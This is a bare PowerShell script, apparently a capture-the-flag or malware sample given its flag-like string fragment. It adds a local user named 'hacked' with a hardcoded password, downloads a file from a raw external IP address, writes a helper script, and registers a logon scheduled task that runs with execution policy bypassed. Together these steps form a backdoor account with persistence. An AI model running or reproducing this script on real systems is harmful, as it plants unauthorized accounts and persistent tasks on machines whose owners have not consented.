$Username = "hacked"
$Password = "hellokitty"
$ImagePath = "C:\Users\Public\Pictures\bg.jpg"
$ImageUrl = "http://61.14.233.104:7331/bg.jpg"
$Part2 = "pp3n3d_1ns1"

Invoke-Expression -Command "net user $Username $Password /add"
Invoke-Expression -Command "net localgroup Users $Username /add"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($ImageUrl, $ImagePath)

$Script = @"
Add-Type -TypeDefinition `
'using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}'

[Wallpaper]::SystemParametersInfo(20, 0, `"$ImagePath`", 0x01 | 0x02);
"@

# [System.Environment]::SetEnvironmentVariable('secret_pass', '<redacted>', [System.EnvironmentVariableTarget]::User) # Do something with bg image

Set-Content -Path "C:\Users\Public\Documents\Set-Wallpaper.ps1" -Value $Script

$schTaskCommand = "schtasks /create /tn 'changewall' /tr 'powershell -ExecutionPolicy Bypass -File C:\Users\Public\Documents\Set-Wallpaper.ps1' /sc ONLOGON /ru $Username"
Invoke-Expression -Command $schTaskCommand